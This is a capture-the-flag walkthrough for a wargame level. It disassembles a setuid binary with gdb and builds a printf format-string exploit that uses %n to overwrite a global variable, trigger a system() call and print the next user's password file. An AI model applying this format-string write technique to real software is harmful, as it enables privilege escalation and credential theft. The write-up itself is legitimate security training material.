# Level 4


<br>

### >> [Flag file](./flag) <<

<br>

### >> [Source file](./source.c) <<

<br>


## TL;DR:

```bash
echo -e '\x10\x98\x04\x08%c%c%c%c%c%c%c%c%c%c%16930102d%n' > /tmp/v  && cat /tmp/v | ./level4
```

<br>


## Explanation:


#### Step 1:

- What's in the home directory:
```bash
ls -la
```

> ```
> total 17
> dr-xr-x---+ 1 level4 level4   80 Mar  6  2016 .
> dr-x--x--x  1 root   root    340 Sep 23  2015 ..
> -rw-r--r--  1 level4 level4  220 Apr  3  2012 .bash_logout
> -rw-r--r--  1 level4 level4 3530 Sep 23  2015 .bashrc
> -rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
> -rw-r--r--+ 1 level4 level4   65 Sep 23  2015 .pass
> -rw-r--r--  1 level4 level4  675 Apr  3  2012 .profile
> ```


#### Step 2:

- Let's see what functions are in the `level4` binary:
```bash
gdb -q ./level4
info function
```

> ```asm
> All defined functions:
> 
> Non-debugging symbols:
> 0x080482f8  _init
> 0x08048340  printf
> 0x08048340  printf@plt
> 0x08048350  fgets
> 0x08048350  fgets@plt
> 0x08048360  system
> 0x08048360  system@plt
> 0x08048370  __gmon_start__
> 0x08048370  __gmon_start__@plt
> 0x08048380  __libc_start_main
> 0x08048380  __libc_start_main@plt
> 0x08048390  _start
> 0x080483c0  __do_global_dtors_aux
> 0x08048420  frame_dummy
> 0x08048444  p
> 0x08048457  n
> 0x080484a7  main
> 0x080484c0  __libc_csu_init
> 0x08048530  __libc_csu_fini
> 0x08048532  __i686.get_pc_thunk.bx
> 0x08048540  __do_global_ctors_aux
> 0x0804856c  _fini
> ```
> We have 3 functions:
> - p
> - n
> - main

#### Step 3:


- Let's disassemble those functions:

```bash
disassemble p
disassemble n
disassemble main
```

>```asm
> (gdb) disassemble p
> Dump of assembler code for function p:
>    0x08048444 <+0>:   push   %ebp
>    0x08048445 <+1>:   mov    %esp,%ebp
>    0x08048447 <+3>:   sub    $0x18,%esp
>    0x0804844a <+6>:   mov    0x8(%ebp),%eax
>    0x0804844d <+9>:   mov    %eax,(%esp)
>    0x08048450 <+12>:  call   0x8048340 <printf@plt>
>    0x08048455 <+17>:  leave  
>    0x08048456 <+18>:  ret    
> End of assembler dump.
>```
> This function is just here to print
>```
> Dump of assembler code for function n:
>    0x08048457 <+0>:   push   %ebp
>    0x08048458 <+1>:   mov    %esp,%ebp
>    0x0804845a <+3>:   sub    $0x218,%esp
>    0x08048460 <+9>:   mov    0x8049804,%eax
>    0x08048465 <+14>:  mov    %eax,0x8(%esp)
>    0x08048469 <+18>:  movl   $0x200,0x4(%esp)
>    0x08048471 <+26>:  lea    -0x208(%ebp),%eax
>    0x08048477 <+32>:  mov    %eax,(%esp)
>    0x0804847a <+35>:  call   0x8048350 <fgets@plt>
>    0x0804847f <+40>:  lea    -0x208(%ebp),%eax
>    0x08048485 <+46>:  mov    %eax,(%esp)
>    0x08048488 <+49>:  call   0x8048444 <p>
>    0x0804848d <+54>:  mov    0x8049810,%eax
>    0x08048492 <+59>:  cmp    $0x1025544,%eax
>    0x08048497 <+64>:  jne    0x80484a5 <n+78>
>    0x08048499 <+66>:  movl   $0x8048590,(%esp)
>    0x080484a0 <+73>:  call   0x8048360 <system@plt>
>    0x080484a5 <+78>:  leave  
>    0x080484a6 <+79>:  ret    
> End of assembler dump.
>```
> This function is the same as the previous level, the only difference is that the `printf` function is called in the `p` function and the value of `m` is now `16930116` instead of `64`.
>```
> Dump of assembler code for function main:
>    0x080484a7 <+0>:   push   %ebp
>    0x080484a8 <+1>:   mov    %esp,%ebp
>    0x080484aa <+3>:   and    $0xfffffff0,%esp
>    0x080484ad <+6>:   call   0x8048457 <n>
>    0x080484b2 <+11>:  leave  
>    0x080484b3 <+12>:  ret    
> End of assembler dump.
>```
> Here the only purpose of the `main` function is to call the `n` function.
>


#### Step 4:

Look what address is overwritten by the `printf` function:
```bash
echo -e "ABCD %x %x %x %x %x %x %x %x %x %x %x %x" | ./level4
ABCD b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 44434241
```

Here we can see that the 12th address is overwritten by the `printf` function. So we can use the `0x8049810` address to write the value `0x1025544` in it.

```bash
echo -e "\x10\x98\x04\x08%c%c%c%c%c%c%c%c%c%c%c %x" | ./level4
���H�@�� 8049810
```

the address `0x8049810` corresponds to the `m` register in the `n` function and the value of `eax` is the length of the input string. So we can use the `%n` format specifier to write the value `0x1025544` in it.

```bash
echo -e '\x10\x98\x04\x08%c%c%c%c%c%c%c%c%c%c%16930102d%n' > /tmp/v  && cat /tmp/v | ./level4
```

And this will print the content of the `.pass` file.

<br>

[[<<]](/level1/walkthrough.md) &nbsp; [[Back to main page]](/Readme.md) &nbsp; [[>>]](/level3/walkthrough.md)
